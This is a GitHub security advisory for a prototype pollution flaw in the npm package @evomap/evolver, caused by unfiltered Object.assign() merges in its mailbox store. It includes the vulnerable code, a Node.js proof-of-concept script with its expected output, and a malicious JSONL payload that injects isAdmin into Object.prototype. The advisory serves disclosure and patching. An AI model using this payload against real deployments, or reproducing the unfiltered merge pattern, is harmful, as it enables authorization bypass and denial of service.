# [M] Evolver has Prototype Pollution via `Object.assign()` in its mailbox store operations

## Summary
Severity: Medium
Advisory: GHSA-2cjr-5v3h-v2w4
CVE: CVE-2026-42077
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-2cjr-5v3h-v2w4
Type: github-advisory

## Affected
- npm: `@evomap/evolver` — affected >=0 <1.69.3

## Details
### Summary
A prototype pollution vulnerability in the mailbox store module allows attackers to modify the behavior of all JavaScript objects by injecting malicious properties into `Object.prototype`. The vulnerability exists in the `_applyUpdate()` and `_updateRecord()` functions which use `Object.assign()` to merge user-controlled data without filtering dangerous keys like `__proto__`, `constructor`, or `prototype`.

### Details
The vulnerability exists in `src/proxy/mailbox/store.js` at lines 123 and 145:

```javascript
// src/proxy/mailbox/store.js:115-128
_applyUpdate(row) {
  if (row._op === 'update') {
    const existing = this._index[row.id];
    // VULNERABLE: Direct Object.assign without key filtering
    if (existing) Object.assign(existing, row.fields);
    else this._index[row.id] = row.fields;
  }
  // ...
}

// src/proxy/mailbox/store.js:138-150
_updateRecord(id, fields) {
  const existing = this._index[id];
  // VULNERABLE: Direct Object.assign without key filtering
  if (existing) Object.assign(existing, fields);
  // ...
}
```

The vulnerability can be triggered when an attacker has the ability to write to the `messages.jsonl` file (used for mailbox persistence). By crafting a malicious JSONL entry with `__proto__` as a field key, the attacker can pollute the prototype of all objects.

The data flows from:
1. `messages.jsonl` file → 
2. `readLines()` function (line 47) → 
3. `_rebuildIndex()` (line 113) → `_applyUpdate()` (line 121) → 
4. `Object.assign()` pollutes prototype

### PoC

**Prerequisites:**
- Node.js installed
- Access to write to the mailbox messages file

**Steps to reproduce:**

1. Create a test file demonstrating the vulnerability:

```javascript
// test-prototype-pollution.js
const fs = require('fs');
const path = require('path');

// Simulate the vulnerable Store class logic
class VulnerableStore {
  constructor(filePath) {
    this.filePath = filePath;
    this._index = {};
  }

  load() {
    if (!fs.existsSync(this.filePath)) return;
    const lines = fs.readFileSync(this.filePath, 'utf8').split('\n');
    for (const line of lines) {
      if (!line.trim()) continue;
      try {
        const row = JSON.parse(line);
        this._applyUpdate(row);
      } catch (e) {
        // Ignore parse errors
      }
    }
  }

  _applyUpdate(row) {
    if (row._op === 'update') {
      const existing = this._index[row.id];
      // VULNERABLE: No filtering of dangerous keys
      if (existing) Object.assign(existing, row.fields);
      else this._index[row.id] = row.fields;
    }
  }

  update(id, fields) {
    this._updateRecord(id, fields);
  }

  _updateRecord(id, fields) {
    const existing = this._index[id];
    // VULNERABLE: No filtering of dangerous keys
    if (existing) Object.assign(existing, fields);
    else this._index[id] = fields;
  }
}

// Test the vulnerability
console.log('=== Testing Prototype Pollution ===\n');

// Create a malicious messages.jsonl file
const maliciousContent = JSON.stringify({
  _op: 'update',
  id: 'msg-123',
  fields: {
    __proto__: {
      polluted: true,
      isAdmin: true
    },
    normalField: 'normalValue'
  }
}) + '\n';

const testDir = '/tmp/evolver-pollution-test';
if (!fs.existsSync(testDir)) fs.mkdirSync(testDir, { recursive: true });
const testFile = path.join(testDir, 'messages.jsonl');

fs.writeFileSync(testFile, maliciousContent);
console.log('Created malicious messages.jsonl');

// Load the store (this triggers the vulnerability)
const store = new VulnerableStore(testFile);
store.load();

// Check if prototype was polluted
console.log('\n=== Checking for prototype pollution ===');
const testObj = {};
console.log('testObj.polluted:', testObj.polluted);
console.log('testObj.isAdmin:', testObj.isAdmin);

if (testObj.polluted === true) {
  console.log('\n🔴 VULNERABILITY CONFIRMED: Object prototype was polluted!');
  console.log('All objects now have "polluted" and "isAdmin" properties.');
} else {
  console.log('\n🟡 Prototype pollution may require different payload structure');
}

// Demonstrate impact - bypassing authentication check
console.log('\n=== Impact Demonstration ===');
function checkAdmin(user) {
  // Typical pattern that would be vulnerable
  if (user.isAdmin) {
    return 'Access granted - Admin privileges';
  }
  return 'Access denied';
}

const regularUser = { name: 'normal_user' };
console.log('Regular user check:', checkAdmin(regularUser));

// Cleanup
fs.rmSync(testDir, { recursive: true });
```

2. Run the test:
```bash
node test-prototype-pollution.js
```

**Expected output:**
```
=== Checking for prototype pollution ===
testObj.polluted: true
testObj.isAdmin: true

🔴 VULNERABILITY CONFIRMED: Object prototype was polluted!
All objects now have "polluted" and "isAdmin" properties.

=== Impact Demonstration ===
Regular user check: Access granted - Admin privileges
```

**Note:** Modern Node.js versions have some prototype pollution protections. For a successful exploit, the attacker might need to use alternative property paths like `constructor.prototype.isAdmin`.

**Attack scenario:**
If an attacker can write to the mailbox messages file (e.g., through file upload, path traversal, or compromised backup restore), they can:
```jsonl
{"_op":"update","id":"malicious","fields":{"__proto__":{"isAdmin":true,"canExecuteArbitraryCode":true}}}
```

### Impact
This is a **Prototype Pollution** vulnerability that can lead to:
- Property injection affecting all JavaScript objects
- Authentication/authorization bypass
- Application logic manipulation
- Denial of service via prototype corruption
- Potential remote code execution if polluted properties affect security-critical code paths

**Attack requirements:** The attacker needs write access to the `messages.jsonl` file. This could be achieved through:
- File upload vulnerabilities
- Path traversal (combined with the Arbitrary File Write vulnerability in the fetch command)
- Compromised backup files
- Shared hosting environments

**Affected users:** Anyone using the mailbox functionality in multi-user environments or with persistent message storage.

## References
- https://github.com/EvoMap/evolver/security/advisories/GHSA-2cjr-5v3h-v2w4
- https://nvd.nist.gov/vuln/detail/CVE-2026-42077
- https://github.com/EvoMap/evolver
- https://github.com/EvoMap/evolver/releases/tag/v1.69.3
